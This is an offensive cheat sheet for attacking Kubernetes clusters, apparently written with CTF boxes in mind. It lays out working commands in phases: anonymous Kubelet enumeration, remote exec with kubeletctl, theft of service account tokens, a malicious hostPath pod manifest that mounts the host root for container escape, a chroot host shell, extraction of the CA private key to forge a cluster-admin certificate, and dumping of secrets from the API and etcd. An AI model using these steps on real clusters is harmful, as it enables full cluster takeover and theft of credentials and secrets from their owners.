# Kubernetes Hacking Cheat Sheet
**Focus**: Misconfigured Kubelet, RBAC abuse, hostPath escapes, credential theft

### Phase 1: Discovery
```bash
# Port scan for Kubernetes services
nmap -p- --open -sV <target-ip>

# Key ports to look for:
# 10250 → Kubelet (anonymous access)
# 8443  → Kubernetes API
# 2379/2380 → etcd
# 10249, 10256 → metrics
```

### Phase 2: Kubelet Anonymous Enumeration
```bash
# Test anonymous access
curl -k https://<target>:10250/pods

# If successful → full pod list (JSON)
# Save and analyze:
cat pods.json | jq '.items[] | {name: .metadata.name, ns: .metadata.namespace, volumes: .spec.volumes}'

# Quick grep for dangerous mounts
strings pods.json | grep -E "hostPath|mountPath" -A 5
```
**Analyze the JSON for:**

- Pods in `default` namespace (non-system)
- `hostPath` volume mounts
- Mount paths containing `/root`, `/opt`, `/flag`, `/etc`
- **Useful `ripgrep` command:
  
```bash
rg -i -C 2 'hostpath|mountpath.*/(root|opt|flag|etc)|"namespace":\s*"default"' .
```

**Critical discovery:**
```json
{
  "name": "nginx",
  "namespace": "default",
  "volumes": [{
    "name": "flag",
    "hostPath": { "path": "/opt/flag" }
  }],
  "volumeMounts": [{
    "mountPath": "/root",
    "name": "flag"
  }]
}
```


### Phase 3: HostPath Detection (High Priority)
Look for:
- `hostPath.path`: `/root`, `/opt`, `/flag`, `/etc`, `/var/lib`, `/`
- Pods in `default` namespace
- Mounts to `/root` or `/host`

### Phase 4: Foothold via kubeletctl
```bash
# Install
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.7/kubeletctl_linux_amd64
chmod +x kubeletctl_linux_amd64 && sudo mv kubeletctl_linux_amd64 /usr/local/bin/kubeletctl

# Scan for RCE
kubeletctl --server <target-ip> scan rce

# Execute commands
kubeletctl --server <target-ip> exec "id" -p <pod-name> -c <container-name>
kubeletctl --server <target-ip> exec "ls -la /root" -p nginx -c nginx
kubeletctl --server <target-ip> exec "cat /root/user.txt" -p nginx -c nginx
```

### Phase 5: Credential Theft
```bash
# Extract SA token and CA cert
kubeletctl --server <target-ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod> -c <container>
kubeletctl --server <target-ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <pod> -c <container>
```

### Phase 6: Kubernetes API Authentication
```bash
export token="eyJhbGciOi...your-token..."
kubectl --token=$token --certificate-authority=ca.crt --server=https://<target>:8443 get pods
kubectl --token=$token --certificate-authority=ca.crt --server=https://<target>:8443 auth can-i --list
```

### Phase 7: Malicious Pod Creation (Host Escape)
```yaml
# malicious-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: malicious-nginx
  namespace: default
spec:
  containers:
  - name: malicious
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /host
      name: host-fs
  volumes:
  - name: host-fs
    hostPath:
      path: /
```

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<target>:8443 apply -f malicious-pod.yaml
kubeletctl --server <target-ip> exec "ls -la /host/root" -p malicious-nginx -c malicious
kubeletctl --server <target-ip> exec "cat /host/root/root.txt" -p malicious-nginx -c malicious
```

### Phase 8: Full Host Shell
```bash
kubeletctl --server <target-ip> exec "chroot /host /bin/bash" -p malicious-nginx -c malicious
```

### Phase 9: CA Key Theft & Certificate Forgery
```bash
# Extract CA private key
base64 /var/lib/minikube/certs/ca.key

# Forge new cluster-admin cert
openssl genrsa -out admin-user.key.pem 2048
openssl req -new -key admin-user.key.pem -out admin-user.csr -subj "/O=system:masters/CN=admin-user"
openssl x509 -req -in admin-user.csr -CA ca.crt.pem -CAkey ca.key.pem -CAcreateserial -out admin-user.crt.pem -days 3650 -sha256
```

### Phase 10: Clean Kubeconfig
```bash
CA_DATA=$(base64 -w 0 ca.crt.pem)
CERT_DATA=$(base64 -w 0 admin-user.crt.pem)
KEY_DATA=$(base64 -w 0 admin-user.key.pem)

cat > admin-kubeconfig.yaml << EOF
apiVersion: v1
kind: Config
clusters:
- name: cluster
  cluster:
    server: https://<target>:8443
    certificate-authority-data: $CA_DATA
contexts:
- name: admin-context
  context:
    cluster: cluster
    user: admin-user
current-context: admin-context
users:
- name: admin-user
  user:
    client-certificate-data: $CERT_DATA
    client-key-data: $KEY_DATA
EOF
```

### Phase 11: Post-Exploitation
```bash
kubectl --kubeconfig=admin-kubeconfig.yaml get secrets -A
kubectl --kubeconfig=admin-kubeconfig.yaml get serviceaccounts -A
strings /var/lib/minikube/etcd/member/snap/db | grep -E "/registry/secrets/"
```

### Quick Reference Commands
- `kubeletctl --server <ip> pods`
- `kubeletctl --server <ip> scan rce`
- `kubectl auth can-i --list`
- `kubectl get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\n"}{end}'`

